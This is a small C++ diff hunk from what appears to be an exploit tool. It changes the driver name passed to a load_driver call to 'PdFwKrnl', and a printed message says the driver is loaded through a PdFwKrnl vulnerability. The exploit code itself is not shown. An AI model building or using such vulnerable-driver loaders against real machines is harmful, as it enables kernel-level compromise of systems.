@@ -17,7 +17,7 @@ int main()
 
     std::cout << "Initializing exploit and loading driver using PdFwKrnl vulnerability...\n";
 
-    Contourne::Status status = Contourne::load_driver("LKS","VuldKrnl");
+    Contourne::Status status = Contourne::load_driver("LKS","PdFwKrnl");
 
     std::cout << " Status: " << Contourne::status_to_string(status) << std::endl;
 
